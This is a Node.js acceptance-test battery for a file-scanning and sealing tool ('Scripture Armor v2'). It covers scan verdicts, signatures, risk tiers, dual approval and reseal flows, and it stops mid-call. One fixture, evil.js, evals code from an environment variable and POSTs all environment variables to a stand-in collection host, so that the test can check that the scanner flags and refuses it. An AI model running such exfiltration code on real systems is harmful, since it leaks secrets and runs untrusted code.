#!/usr/bin/env node
// run-tests-v2-scan.mjs — Scripture Armor v2, Closure 1 acceptance battery
// (SPEC §1.9, cases 1–26 + Phase-1 steer surfaces: terms handshake,
// launch command, capability rule).
//
// Cases whose full form belongs to Closure 2 (activation cells) are
// marked DEFERRED(phase2) and counted separately — never as PASS. Their
// Phase-1 surfaces (registry params snapshot, superseded beacon at
// unwrap, reseal-overdue refusal, untiered naming) ARE asserted here.
//
// Needs: gcc (fixtures), Ghidra + JDK (under ~/workspace/tools), UPX
// (packed fixture; case 6 skips loudly if absent).

import { execFile, spawn, spawnSync } from 'node:child_process';
import { promisify } from 'node:util';
import crypto from 'node:crypto';
import fs from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import {
  loadIdentity, parseScriptureFile, commitFor, unsealFileKey,
  ownerSocketFor, ownerTokenPathFor, ownerConfirmPathFor,
} from '../armor.mjs';
import { scanFile, scanDigestOf } from '../scan.mjs';
const scanRec = async (f, opts) => (await scanFile(f, opts)).record;
import { TERMS_VERSION, termsSha256 } from '../terms.mjs';

const execFileP = promisify(execFile);
const HERE = path.dirname(new URL(import.meta.url).pathname);
const ROOT = path.join(HERE, '..');
const V1 = path.join(ROOT, '..', 'scripture-armor-standalone');
const ARMOR = path.join(ROOT, 'armor.mjs');
const VAULTD = path.join(ROOT, 'vaultd.mjs');
const LAUNCH = path.join(ROOT, 'launch.mjs');
const NODE = process.execPath;

let passed = 0, failed = 0, deferred = 0;
const failures = [];
function check(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  PASS  ${name}`); }
  else { failed++; failures.push(name); console.log(`  FAIL  ${name}${extra ? ` — ${extra}` : ''}`); }
}
function defer(name, note) {
  deferred++;
  console.log(`  DEFERRED(phase2)  ${name} — ${note}`);
}
const sha256Hex = (buf) => crypto.createHash('sha256').update(buf).digest('hex');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function run(file, args, { input = null, env = {}, cwd = ROOT } = {}) {
  const r = spawnSync(file, args, { input, env: { ...process.env, ...env }, cwd, encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
  return { code: r.status, out: r.stdout || '', err: r.stderr || '' };
}
const armor = (args, opts) => run(NODE, [ARMOR, ...args], opts);
const armorV1 = (args, opts) => run(NODE, [path.join(V1, 'armor.mjs'), ...args], opts);
const vaultdCli = (args, opts) => run(NODE, [VAULTD, ...args], opts);

function mkStore(label) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `sa2-${label}-`));
  const r = armor(['identity', '--label', label, '--identity-dir', dir]);
  if (r.code !== 0) throw new Error(`identity ${label}: ${r.err}`);
  const block = r.out.trim(); // v2 identity prints ONLY the public block on stdout
  if (block.length > 40) BLOCKS.set(dir, block);
  return dir;
}
function trustPeer(storeDir, peerDir) {
  const peer = loadIdentity(peerDir);
  const block = publicBlockOf(peerDir);
  if (!block) throw new Error(`no public block captured for ${peerDir}`);
  const r = armor(['trust', peer.label, block, '--identity-dir', storeDir]);
  if (r.code !== 0) throw new Error(`trust ${peer.label} -> ${storeDir}: ${r.err}`);
}
function writePolicy(storeDir, policy) {
  fs.writeFileSync(path.join(storeDir, 'policy.json'), JSON.stringify(policy, null, 2), { mode: 0o600 });
}
function clearPolicy(storeDir) { try { fs.unlinkSync(path.join(storeDir, 'policy.json')); } catch {} }

async function startDaemon(storeDir, { windowS = 120 } = {}) {
  const socket = path.join(storeDir, 'vaultd.sock');
  const proc = spawn(NODE, [VAULTD, 'serve', '--identity-dir', storeDir], {
    env: { ...process.env, VAULTD_WINDOW_S: String(windowS) },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let out = '';
  await new Promise((resolve, reject) => {
    const to = setTimeout(() => reject(new Error(`daemon start timeout: ${out}`)), 15000);
    proc.stdout.on('data', (d) => { out += d; if (out.includes('listening')) { clearTimeout(to); resolve(); } });
    proc.on('exit', (c) => { clearTimeout(to); reject(new Error(`daemon exited ${c}: ${out}`)); });
  });
  return { proc, socket, storeDir };
}
function rpcOnce(socket, obj) {
  return new Promise((resolve, reject) => {
    const conn = net.createConnection(socket);
    let buf = '';
    conn.on('connect', () => conn.write(JSON.stringify(obj) + '\n'));
    conn.on('data', (d) => {
      buf += d;
      const i = buf.indexOf('\n');
      if (i >= 0) { try { conn.end(); } catch {} resolve(JSON.parse(buf.slice(0, i))); }
    });
    conn.on('error', reject);
    setTimeout(() => { try { conn.destroy(); } catch {} reject(new Error('rpc timeout')); }, 15000);
  });
}
// Present a package; returns handles: .pending resolves with the pending
// message, .final resolves with all messages once the daemon concludes.
function present(socket, pkgPath, outName, purpose = null) {
  let pendingResolve; const pending = new Promise((r) => { pendingResolve = r; });
  const final = new Promise((resolve) => {
    const conn = net.createConnection(socket);
    let buf = ''; const msgs = [];
    const done = () => { try { conn.end(); } catch {} resolve(msgs); };
    conn.on('connect', () => conn.write(JSON.stringify({ cmd: 'unwrap', path: pkgPath, out: outName, purpose }) + '\n'));
    conn.on('data', (d) => {
      buf += d; let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, i); buf = buf.slice(i + 1);
        if (!line.trim()) continue;
        const m = JSON.parse(line); msgs.push(m);
        if (m.state === 'pending-approval') pendingResolve(m);
        if (m.state === 'unwrapped' || m.beacon || m.ok === false) { setTimeout(done, 50); return; }
      }
    });
    conn.on('error', () => resolve(msgs));
    setTimeout(done, 45000);
  });
  return { pending, final };
}
// Phase 4 (FIX 1): approvals are owner acts — they ride the owner
// socket with the daemon's owner token, and the dual-approval code is
// read from the owner channel state (it is never in a socket response).
function ownerRpc(socket, obj) {
  let token = '';
  try { token = fs.readFileSync(ownerTokenPathFor(socket), 'utf8').trim(); } catch {}
  return rpcOnce(ownerSocketFor(socket), { ...obj, owner_token: token });
}
function readConfirm(socket, id) {
  try { return JSON.parse(fs.readFileSync(ownerConfirmPathFor(socket, id), 'utf8')); } catch { return null; }
}
async function approveFlow(socket, pendingMsg, { dual = false } = {}) {
  const a1 = await ownerRpc(socket, { cmd: 'approve', id: pendingMsg.id });
  if (!dual) return a1;
  const code = readConfirm(socket, pendingMsg.id)?.code ?? null;
  const stage1 = { ...a1, confirm_code: code };
  if (a1.approved_stage !== 1 || !code) return { stage1 };
  const badTry = await ownerRpc(socket, { cmd: 'approve', id: pendingMsg.id, confirm: '000000' === code ? '111111' : '000000' });
  const a2 = await ownerRpc(socket, { cmd: 'approve', id: pendingMsg.id, confirm: code });
  return { stage1, badTry, final: a2 };
}
async function presentAndApprove(socket, pkgPath, outName, { dual = false } = {}) {
  const p = present(socket, pkgPath, outName);
  const pend = await p.pending;
  const appr = await approveFlow(socket, pend, { dual });
  const msgs = await p.final;
  return { pend, appr, msgs, last: msgs[msgs.length - 1] };
}
// Flip one character in a package's armor body (line 3+). Any body-text
// change invalidates the frame signature, which hashes the body text.
function flipBodyChar(text) {
  const lines = text.split('\n');
  const row = lines[2].split('');
  row[3] = row[3] === 'X' ? 'Y' : 'X';
  lines[2] = row.join('');
  return lines.join('\n');
}
function registryOf(storeDir) {
  try { return JSON.parse(fs.readFileSync(path.join(storeDir, 'registry.json'), 'utf8')); }
  catch { return { entries: {} }; }
}
function beaconTail(storeDir, n = 4000) {
  // Beacon events are testimony-log lines in vaultd.log.
  try { return fs.readFileSync(path.join(storeDir, 'vaultd.log'), 'utf8'); } catch { return ''; }
}
const BLOCKS = new Map();
function publicBlockOf(dir) {
  if (BLOCKS.has(dir)) return BLOCKS.get(dir);
  const r = armor(['identity', '--identity-dir', dir]);
  const block = r.out.trim();
  if (block.length > 40) { BLOCKS.set(dir, block); return block; }
  return null;
}

async function main() {
  console.log('Scripture Armor v2 — Closure 1 acceptance battery');
  // ===================== Case 17: v1 suite ===========================
  console.log('\n[17] v1-suite-green (the 53 v1 checks, run in the v2 tree)');
  {
    const r = run(NODE, [path.join(ROOT, 'test', 'run-tests.mjs')], { cwd: ROOT });
    const m = (r.out + r.err).match(/(\d+)\/(\d+) checks passed/);
    if (!m || m[1] !== m[2] || r.code !== 0) {
      try { fs.writeFileSync('/tmp/case17-suite-output.log', r.out + '\n--- STDERR ---\n' + r.err); } catch {}
    }
    check('v1 suite fully green in the v2 tree', !!m && m[1] === m[2] && r.code === 0,
      m ? `${m[1]}/${m[2]}` : (r.out + r.err).slice(-400));
  }

  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sa2-battery-'));
  // ---- fixtures ------------------------------------------------------
  const BIN = path.join(T, 'bin'); fs.mkdirSync(BIN);
  const gcc = run('gcc', ['-O1', '-U_FORTIFY_SOURCE', '-D_FORTIFY_SOURCE=0', '-o', path.join(BIN, 'bad.bin'), path.join(HERE, 'fixtures-src', 'bad.c')]);
  run('gcc', ['-O1', '-U_FORTIFY_SOURCE', '-D_FORTIFY_SOURCE=0', '-o', path.join(BIN, 'clean.bin'), path.join(HERE, 'fixtures-src', 'clean.c')]);
  if (gcc.code !== 0) throw new Error(`gcc fixture build failed: ${gcc.err}`);
  const badBin = path.join(BIN, 'bad.bin'), cleanBin = path.join(BIN, 'clean.bin');
  let packedBin = null;
  const upxPath = fs.existsSync(path.join(os.homedir(), 'workspace', 'tools', 'upx', 'upx'))
    ? path.join(os.homedir(), 'workspace', 'tools', 'upx', 'upx') : 'upx';
  const upx = run(upxPath, ['-q', '--best', '-o', path.join(BIN, 'packed.bin'), badBin]);
  if (upx.code === 0) packedBin = path.join(BIN, 'packed.bin');

  const S = mkStore('wrap-side');
  const R = mkStore('recv-side');
  trustPeer(S, R); trustPeer(R, S);
  const D = await startDaemon(R);
  const wrapTo = (file, extra = [], opts = {}) => armor(
    ['wrap', file, '--to', 'recv-side', '--socket', D.socket, '--identity-dir', S, ...extra], opts);
  const wrapToBare = (file, extra = [], opts = {}) => armor(
    ['wrap', file, '--to', 'recv-side', '--identity-dir', S, ...extra], opts);

  // ============================ Case 1 ================================
  console.log('\n[1] binary-critical (Ghidra lane)');
  const scanBad = await scanRec(badBin, { storeDir: S });
  check('bad.bin verdict is critical', scanBad.verdict === 'critical', scanBad.verdict);
  check('bad.bin carries a critical sink-reachability (exec, non-literal)',
    scanBad.findings.some((f) => f.rule === 'sink-reachability' && f.severity === 'critical'));
  check('bad.bin carries unbounded-copy findings',
    scanBad.findings.some((f) => (f.rule === 'unbounded-copy-call' || f.rule === 'sink-reachability') && /strcpy|sprintf/.test(f.location + f.detail)));
  const w1 = wrapTo(badBin);
  check('critical wrap refused by default (exit != 0, no package)',
    w1.code !== 0 && !fs.existsSync(`${badBin}.scripture`), `code=${w1.code} err=${w1.err.slice(0, 200)}`);
  check('refusal wrote the sealed scan report beside the target',
    fs.existsSync(`${badBin}.scan-report.scripture`));
  {
    const reg = registryOf(R);
    const reportEntry = Object.values(reg.entries).find((e) => e.report_only && e.report_for === scanBad.target_sha256);
    check('refused scan registered as a report-only issuance (linked by report_for)', !!reportEntry);
    // Phase 4 (FIX 3): entries carry no plaintext hash to match the
    // target against — the property is that the refusal registered
    // NOTHING but the report: every entry present is report-only.
    check('no issuance exists for the refused target itself',
      Object.values(reg.entries).every((e) => e.report_only));
  }

  // ============================ Case 2 ================================
  console.log('\n[2] binary-clean-control');
  const scanClean = await scanRec(cleanBin, { storeDir: S });
  check('clean.bin verdict is pass', scanClean.verdict === 'pass', scanClean.verdict);
  check('clean.bin tier is 0', scanClean.risk.tier === 0);
  check('clean.bin has NO critical/high finding',
    !scanClean.findings.some((f) => f.severity === 'critical' || f.severity === 'high'),
    JSON.stringify(scanClean.findings.map((f) => `${f.severity}:${f.rule}`)));
  const w2 = wrapTo(cleanBin);
  check('clean.bin wraps', w2.code === 0 && fs.existsSync(`${cleanBin}.scripture`), w2.err.slice(0, 200));
  {
    const pa = await presentAndApprove(D.socket, `${cleanBin}.scripture`, 'clean.out');
    check('clean.bin unwraps byte-identical after approval',
      pa.last?.state === 'unwrapped' && sha256Hex(fs.readFileSync(path.join(R, 'out', 'clean.out'))) === sha256Hex(fs.readFileSync(cleanBin)));
  }

  // ============================ Case 3 ================================
  console.log('\n[3] report-sealed-complete (digest recomputable from the report itself)');
  {
    const pa = await presentAndApprove(D.socket, `${badBin}.scan-report.scripture`, 'bad-report.out');
    const plain = fs.readFileSync(path.join(R, 'out', 'bad-report.out'));
    const rec = JSON.parse(plain.toString('utf8'));
    const frame = parseScriptureFile(fs.readFileSync(`${cleanBin}.scripture`, 'utf8')).frame;
    const badReportFrame = parseScriptureFile(fs.readFileSync(`${badBin}.scan-report.scripture`, 'utf8')).frame;
    check('report plaintext parses as the canonical scan record', rec.format === 'scripture-armor-scan/1');
    // Phase 4 (FIX 3): the anchor is the frame's KEYED commitment now —
    // recomputable by the report's holder (who recovers the file key),
    // never by an outsider holding only the artifact.
    check('refused report is anchored by its own frame commitment (commit == HMAC(file key, plaintext))',
      commitFor(unsealFileKey(loadIdentity(R), badReportFrame), plain) === badReportFrame.commit,
      `commit=${badReportFrame.commit}`);
    check('report findings match the direct scan', rec.verdict === 'critical' && rec.findings.length === scanBad.findings.length);
    // The §0.3 digest binding on a WRAPPED target: the target frame's
    // scan_digest equals the timestamp-free canonical digest of its
    // report's record, recomputable by anyone holding the opened report
    // (Phase 4, FIX 5 — the binding survives; raw sha256 of the record
    // bytes was timestamp-poisoned and could never reproduce).
    const pc = await presentAndApprove(D.socket, `${cleanBin}.scan-report.scripture`, 'clean-report.out');
    const cleanPlain = fs.readFileSync(path.join(R, 'out', 'clean-report.out'));
    check('wrapped target: scanDigestOf(report record) == target frame.scan_digest',
      scanDigestOf(JSON.parse(cleanPlain.toString('utf8'))) === frame.scan_digest,
      `${frame.scan_digest}`);
  }

  // ============================ Case 4 ================================
  console.log('\n[4] frame-carries-scan (tamper-evident binding)');
  {
    const insp = armor(['inspect', `${cleanBin}.scripture`]);
    check('inspect prints scan verdict + tier + digest',
      /scan:\s+verdict/.test(insp.out) && /armor tier:/.test(insp.out), insp.out.slice(0, 300));
    const pkgText = fs.readFileSync(`${cleanBin}.scripture`, 'utf8');
    const tpath = path.join(T, 'tampered.scripture'); fs.writeFileSync(tpath, flipBodyChar(pkgText));
    const insp2 = armor(['inspect', tpath]);
    check('flipping one armor glyph invalidates the signature', /signature:\s+INVALID/.test(insp2.out));
  }

  // ============================ Case 6/7 ==============================
  console.log('\n[6] packed-confidence-caps-verdict');
  if (packedBin) {
    const scanPacked = await scanRec(packedBin, { storeDir: S });
    check('packed.bin analysis_confidence is low', scanPacked.analysis_confidence === 'low', scanPacked.analysis_confidence);
    check('packed.bin verdict capped at warn (never pass, never critical on this evidence)',
      scanPacked.verdict === 'warn', scanPacked.verdict);
    check('packed.bin carries the static-analysis-limited finding',
      scanPacked.findings.some((f) => f.rule === 'static-analysis-limited'));
  } else {
    check('packed fixture available (UPX)', false, 'upx not found — case 6 cannot run');
  }
  console.log('\n[7] confidence-reported');
  check('clean scan reports confidence full', scanClean.analysis_confidence === 'full');

  // ============================ Case 12/13/18 =========================
  console.log('\n[12] engine-missing-fails-closed');
  {
    const before = (await rpcOnce(D.socket, { cmd: 'status' })).registry_issued;
    writePolicy(S, { scan: { ghidra_home: '/nonexistent-xyz' } });
    const w = wrapTo(badBin);
    check('missing engine refuses the wrap naming the cause',
      w.code !== 0 && /GHIDRA_NOT_FOUND/.test(w.err + w.out), (w.err + w.out).slice(0, 200));
    check('nothing registered on engine-missing refusal',
      (await rpcOnce(D.socket, { cmd: 'status' })).registry_issued === before);
    clearPolicy(S);
  }
  console.log('\n[13] engine-timeout-fails-closed');
  {
    writePolicy(S, { scan: { timeout_s: 1 } });
    const w = wrapTo(badBin);
    check('engine timeout refuses as unscanned-engine-error',
      w.code !== 0 && /unscanned-engine-error|ENGINE_TIMEOUT|scan-timeout/.test(w.err + w.out), (w.err + w.out).slice(0, 200));
    clearPolicy(S);
  }
  console.log('\n[18] no-cleartext-residue');
  check('scan-work staging area is empty after pass/fail/timeout runs',
    !fs.existsSync(path.join(S, 'scan-work')) || fs.readdirSync(path.join(S, 'scan-work')).length === 0,
    fs.existsSync(path.join(S, 'scan-work')) ? fs.readdirSync(path.join(S, 'scan-work')).join(',') : '');

  // ============================ Case 14/15/16 ========================
  console.log('\n[14] source-critical-refused');
  const evilJs = path.join(T, 'evil.js');
  fs.writeFileSync(evilJs, [
    'const fs = require("fs");',
    'const code = process.env.INCOMING_CODE;',
    'eval(code);',
    'fetch("https://example.invalid/collect", { method: "POST", body: JSON.stringify(process.env) });',
    'fs.readdirSync("/");',
  ].join('\n'));
  {
    const scanEvil = await scanRec(evilJs, { storeDir: S });
    check('evil.js verdict critical via source-composite (two independent highs)',
      scanEvil.verdict === 'critical' && scanEvil.findings.some((f) => f.rule === 'source-composite-critical'),
      `${scanEvil.verdict} ${JSON.stringify(scanEvil.findings.map((f) => f.rule))}`);
    const w = wrapTo(evilJs);
    check('evil.js wrap refused by default', w.code !== 0 && !fs.existsSync(`${evilJs}.scripture`));
  }
  console.log('\n[15] data-no-scan');
  const noteTxt = path.join(T, 'note.txt');
  fs.writeFileSync(noteTxt, 'just a note, definitely not code.\n');
  {
    const t0 = Date.now();
    const w = wrapTo(noteTxt);
    const frame = parseScriptureFile(fs.readFileSync(`${noteTxt}.scripture`, 'utf8')).frame;
    check('data file wraps with scan_verdict not-applicable', w.code === 0 && frame.scan_verdict === 'not-applicable',
      `${frame.scan_verdict}`);
    check('data file gets no report package', frame.scan_report == null);
    check('data file is tier 0', frame.armor_tier === 0);
    check('data wrap did not invoke the engine (fast)', Date.now() - t0 < 10000, `${Date.now() - t0}ms`);
  }
  console.log('\n[16] exact-hash-critical');
  {
    fs.writeFileSync(path.join(S, 'badhashes.txt'), `${sha256Hex(fs.readFileSync(cleanBin))}\n`);
    const scanH = await scanRec(cleanBin, { storeDir: S });
    check('owner badhashes.txt hit makes even the clean binary critical',
      scanH.verdict === 'critical' && scanH.findings.some((f) => f.rule === 'exact-sample-hash' && f.basis === 'exact-hash'));
    fs.unlinkSync(path.join(S, 'badhashes.txt'));
  }

  D.proc.kill('SIGTERM');
  await sleep(300);

  // ============================ Case 11 ================================
  console.log('\n[11] v1-package-unwraps (scan-missing classification)');
  {
    const Sv1 = fs.mkdtempSync(path.join(os.tmpdir(), 'sa2-v1-'));
    const r1 = armorV1(['identity', '--label', 'v1-side', '--identity-dir', Sv1]);
    check('v1 identity created', r1.code === 0, r1.err.slice(0, 120));
    // Trust the v2 recipient in the v1 store (v1 trust CLI: label + block args).
    const block = publicBlockOf(R);
    const rt = armorV1(['trust', 'recv-side', block, '--identity-dir', Sv1]);
    check('v1 store trusts the v2 recipient', rt.code === 0, rt.err.slice(0, 160));
    let v1Pkg = path.join(T, 'v1doc.txt');
    fs.writeFileSync(v1Pkg, 'a document from the v1 era\n');
    const wv1 = armorV1(['wrap', v1Pkg, '--to', 'recv-side', '--identity-dir', Sv1]);
    if (wv1.code === 0 && fs.existsSync(`${v1Pkg}.scripture`)) {
      const D2 = await startDaemon(R);
      // Phase 4: the v1 tool's unsigned registration is refused by design
      // now — a foreign issuance reaches the v2 daemon only when its OWNER
      // relays it over the owner channel (the owner vouches in person).
      const v1Frame = parseScriptureFile(fs.readFileSync(`${v1Pkg}.scripture`, 'utf8')).frame;
      const reg = await ownerRpc(D2.socket, {
        cmd: 'register',
        entries: [{
          canary: v1Frame.canary, digest: v1Frame.sha256, digest_kind: 'sha256',
          recipient_seal_fp: v1Frame.recipient_seal_fp, sender_sign_fp: v1Frame.sender_sign_fp,
          expiry: v1Frame.expiry ?? null, origin: 'egress', scan: null, tier: null,
        }],
      });
      check('v1 package registers at the v2 daemon (owner relay)', reg.ok === true && reg.registered === 1,
        JSON.stringify(reg).slice(0, 160));
      const pa = await presentAndApprove(D2.socket, `${v1Pkg}.scripture`, 'v1doc.out');
      check('v1 package pends with the unscanned/untiered notice',
        (pa.pend.notices || []).some((n) => /v1 package/.test(n) && /untiered/.test(n)),
        JSON.stringify(pa.pend.notices));
      check('v1 package unwraps byte-identical',
        pa.last?.state === 'unwrapped' && fs.readFileSync(path.join(R, 'out', 'v1doc.out'), 'utf8') === 'a document from the v1 era\n');
      D2.proc.kill('SIGTERM');
    } else {
      check('v1 package could be produced with the v1 tool', false, `trust=${rt.code} wrap=${wv1.code} ${wv1.err.slice(0, 160)}`);
    }
    defer('v1-package activation-side classification (untiered => activation refusal)',
      'LANDED in Phase 2: test/run-tests-v2-cell.mjs case D11 (v1 issuance classifies untiered at the v2 daemon; activation refused, nothing runs)');
  }

  // ===================== Cases 19/20/21 (repo tiers) =================
  console.log('\n[19] repo-tier-separation');
  const RS = mkStore('repo-wrap');
  const RR = mkStore('repo-recv');
  trustPeer(RS, RR); trustPeer(RR, RS);
  const DR = await startDaemon(RR);
  const repoSrc = path.join(T, 'repo-src'); fs.mkdirSync(repoSrc);
  fs.copyFileSync(badBin, path.join(repoSrc, 'bad.bin'));
  fs.copyFileSync(cleanBin, path.join(repoSrc, 'clean.bin'));
  fs.writeFileSync(path.join(repoSrc, 'notes.txt'), 'release notes\n');
  const repoOut = path.join(T, 'repo-wrapped');
  const wr = armor(['wrap-repo', repoSrc, '--out', repoOut, '--to', 'repo-recv', '--socket', DR.socket,
    '--identity-dir', RS, '--expires', '+30d'], { input: 'OVERRIDE\n' });
  check('repo wrap with typed OVERRIDE succeeds', wr.code === 0, wr.err.slice(0, 300));
  const regR = registryOf(RR);
  const repoEntries = Object.values(regR.entries).filter((e) => e.repo);
  const badEntry = repoEntries.find((e) => e.tier?.tier === 2);
  const cleanEntry = repoEntries.find((e) => e.tier?.tier === 0 && !e.report_only);
  check('repo registry: the bad part is tier 2, a clean part is tier 0', !!badEntry && !!cleanEntry,
    JSON.stringify(repoEntries.map((e) => e.tier?.tier)));
  const badPartPkg = path.join(repoOut, 'files', 'bad.bin.part0000.scripture');
  const cleanPartPkg = path.join(repoOut, 'files', 'clean.bin.part0000.scripture');
  const badFrame = parseScriptureFile(fs.readFileSync(badPartPkg, 'utf8')).frame;
  const cleanFrame = parseScriptureFile(fs.readFileSync(cleanPartPkg, 'utf8')).frame;
  check('tier-2 part expiry is capped at 24h even in a 30d repo',
    Date.parse(badFrame.expiry) - Date.now() <= 24 * 3600 * 1000 + 60000, badFrame.expiry);
  check('tier-0 part keeps the 30d repo expiry',
    Date.parse(cleanFrame.expiry) - Date.now() > 24 * 3600 * 1000, cleanFrame.expiry);
  check('tier-2 part has a sealed scan report in reports/',
    fs.existsSync(path.join(repoOut, 'reports', 'bad.bin.scan-report.scripture')));
  check('registry tier-2 params snapshot is the heavier set (dual approval, hard cell, airlock-only, no downgrade)',
    badEntry?.tier?.params?.dual_approval === true && badEntry?.tier?.params?.min_cell === 'hard'
    && badEntry?.tier?.params?.egress === 'airlock-only'
    && badEntry?.tier?.params?.downgrade_allowed === false
    && badEntry?.tier?.params?.reseal_hours === 24
    && badEntry?.tier?.params?.expiry_cap_hours === 24,
    JSON.stringify(badEntry?.tier?.params));
  defer('[21] tier2-activation-placement (HARD-cell-only / airlock-only egress enforcement)',
    'LANDED in Phase 2: test/run-tests-v2-cell.mjs case D21 — params snapshot asserted here; on a HARD-less host the Tier-2 activation refuses (downgrade forbidden), and airlock-only egress is enforced in the daemon egress handler for Tier-2 runs where a HARD substrate exists');

  console.log('\n[20] tier2-dual-approval');
  {
    const pa = await presentAndApprove(DR.socket, badPartPkg, 'bad-part.out', { dual: true });
    check('tier-2 part: first approve returns stage 1 + confirmation code, does NOT unwrap',
      pa.appr.stage1?.approved_stage === 1 && !!pa.appr.stage1?.confirm_code);
    check('tier-2 part: wrong confirmation code refused',
      pa.appr.badTry?.ok === false && /dual-confirm-mismatch/.test(pa.appr.badTry?.error || ''));
    check('tier-2 part: second approve with the code unwraps byte-identical',
      pa.last?.state === 'unwrapped' && sha256Hex(fs.readFileSync(path.join(RR, 'out', 'bad-part.out'))) === sha256Hex(fs.readFileSync(badBin)));
    const pc = await presentAndApprove(DR.socket, cleanPartPkg, 'clean-part.out');
    check('tier-0 part in the same repo: single approval unwraps',
      pc.last?.state === 'unwrapped' && sha256Hex(fs.readFileSync(path.join(RR, 'out', 'clean-part.out'))) === sha256Hex(fs.readFileSync(cleanBin)));
    check('pending carried the scan + tier notices for the tier-2 part',
      (pa.pend.notices || []).some((n) => /armor tier 2/.test(n)));
  }

  // ===================== Cases 24/25 (coverage) ======================
  console.log('\n[24] coverage-accounting');
  const covSrc = path.join(T, 'cov-src'); fs.mkdirSync(path.join(covSrc, 'sub'), { recursive: true });
  fs.writeFileSync(path.join(covSrc, 'a.js'), 'console.log("hello");\n');
  fs.writeFileSync(path.join(covSrc, 'empty.txt'), '');
  fs.writeFileSync(path.join(covSrc, 'sub', 'blob.bin'), crypto.randomBytes(1024));
  fs.symlinkSync(path.join(covSrc, 'a.js'), path.join(covSrc, 'link.js'));
  const covOut = path.join(T, 'cov-wrapped');
  const wc = armor(['wrap-repo', covSrc, '--out', covOut, '--to', 'repo-recv', '--socket', DR.socket, '--identity-dir', RS]);
  check('coverage repo wraps', wc.code === 0, wc.err.slice(0, 200));
  check('symlink excluded with its reason named in the wrap output',
    /skipped:\s+link\.js — symlink/.test(wc.err), wc.err.slice(0, 300));
  check('real file wrapped, zero-byte file has no package (manifest-vouched)',
    fs.existsSync(path.join(covOut, 'files', 'a.js.part0000.scripture')) && !fs.existsSync(path.join(covOut, 'files', 'empty.txt.part0000.scripture')));
  {
    const vfy = armor(['verify', covOut, '--identity-dir', RR]);
    check('verify passes on the accounted tree', vfy.code === 0, (vfy.out + vfy.err).slice(0, 200));
    console.log('\n[25] unaccounted-package-detected');
    fs.copyFileSync(path.join(covOut, 'files', 'a.js.part0000.scripture'), path.join(covOut, 'files', 'zzz.scripture'));
    const vfy2 = armor(['verify', covOut, '--identity-dir', RR]);
    check('planted unlisted package FAILs verify, named',
      vfy2.code !== 0 && /unaccounted package: files\/zzz\.scripture/.test(vfy2.out + vfy2.err),
      (vfy2.out + vfy2.err).slice(0, 300));
    fs.unlinkSync(path.join(covOut, 'files', 'zzz.scripture'));
  }
  DR.proc.kill('SIGTERM');
  await sleep(300);

  // ===================== Cases 5/8/9/10/22/23 (one tier-2 daemon) ====
  console.log('\n[22] reseal-overdue-refusal + reseal + superseded beacon');
  const S2 = mkStore('t2-wrap');
  const R2 = mkStore('t2-recv');
  trustPeer(S2, R2); trustPeer(R2, S2);
  writePolicy(S2, { scan: { tiers: { 2: { reseal_hours: 0 } } } });
  const DT = await startDaemon(R2);
  const wBad2 = armor(['wrap', badBin, '--to', 't2-recv', '--socket', DT.socket, '--identity-dir', S2,
    '--override-scan', 'battery case 22: known-bad fixture under owner override'], { input: 'OVERRIDE\n' });
  const bad2Pkg = `${badBin}.scripture`;
  check('tier-2 package wraps under a signed override', wBad2.code === 0 && fs.existsSync(bad2Pkg), wBad2.err.slice(0, 200));
  {
    const f = parseScriptureFile(fs.readFileSync(bad2Pkg, 'utf8')).frame;
    check('override is inside the signed frame (by/reason/at)',
      !!f.scan_override && /battery case 22/.test(f.scan_override.reason) && f.armor_tier === 2);
    const p = present(DT.socket, bad2Pkg, 'bad2.out');
    const msgs = await p.final;
    const last = msgs[msgs.length - 1];
    check('past-deadline tier-2 unwrap refused as reseal-overdue (normal purpose)',
      last?.ok === false && /reseal-overdue/.test(last?.error || ''), JSON.stringify(last).slice(0, 200));
  }
  // Re-seal under a sane cadence so the NEW issuance is usable.
  writePolicy(S2, { scan: { tiers: { 2: { reseal_hours: 2400 } } } });
  let resealedPkg = null;
  {
    const proc = spawn(NODE, [ARMOR, 'reseal', bad2Pkg, '--socket', DT.socket, '--identity-dir', S2],
      { stdio: ['ignore', 'pipe', 'pipe'] });
    let out = '', err = '';
    proc.stdout.on('data', (d) => { out += d; });
    proc.stderr.on('data', (d) => { err += d; });
    const exitP = new Promise((r) => proc.on('exit', r)); // captured at spawn — never after
    // Drive the dual approvals the reseal's daemon unwrap requires.
    const t0 = Date.now();
    let doneFlag = false;
    exitP.then(() => { doneFlag = true; });
    while (!doneFlag && Date.now() - t0 < 90000) {
      const pend = await rpcOnce(DT.socket, { cmd: 'pending' }).catch(() => null);
      const item = pend?.pending?.[0];
      if (item) {
        const a1 = await ownerRpc(DT.socket, { cmd: 'approve', id: item.id });
        if (a1?.approved_stage === 1) {
          const code = readConfirm(DT.socket, item.id)?.code;
          await ownerRpc(DT.socket, { cmd: 'approve', id: item.id, confirm: code });
        }
      }
      await sleep(250);
    }
    const code = await exitP;
    resealedPkg = out.trim().split('\n').pop();
    check('reseal completes through the governed path (purpose=reseal past the deadline)',
      code === 0 && !!resealedPkg && fs.existsSync(resealedPkg), `code=${code} err=${err.slice(0, 240)}`);
    const reg = registryOf(R2);
    const oldCanary = parseScriptureFile(fs.readFileSync(bad2Pkg, 'utf8')).frame.canary;
    check('registry marks the old issuance superseded_by the new canary',
      reg.entries[oldCanary]?.superseded_by != null, JSON.stringify(reg.entries[oldCanary]?.superseded_by));
    const pOld = present(DT.socket, bad2Pkg, 'bad2-old.out');
    const msgsOld = await pOld.final;
    check('the superseded old package beacon-refuses, naming the successor',
      msgsOld.some((m) => m.beacon === true) || /superseded/.test(JSON.stringify(msgsOld)),
      JSON.stringify(msgsOld).slice(0, 240));
    check('beacon log records reason_class superseded with the new canary',
      /"reason_class":"superseded"/.test(beaconTail(R2)) && /"superseded_by"/.test(beaconTail(R2)));
    if (resealedPkg) {
      const pa = await presentAndApprove(DT.socket, resealedPkg, 'bad2-new.out', { dual: true });
      check('the resealed package unwraps (dual approval) byte-identical',
        pa.last?.state === 'unwrapped' && sha256Hex(fs.readFileSync(path.join(R2, 'out', 'bad2-new.out'))) === sha256Hex(fs.readFileSync(badBin)));
    }
  }
  defer('[22b] per-access report re-verification at activation',
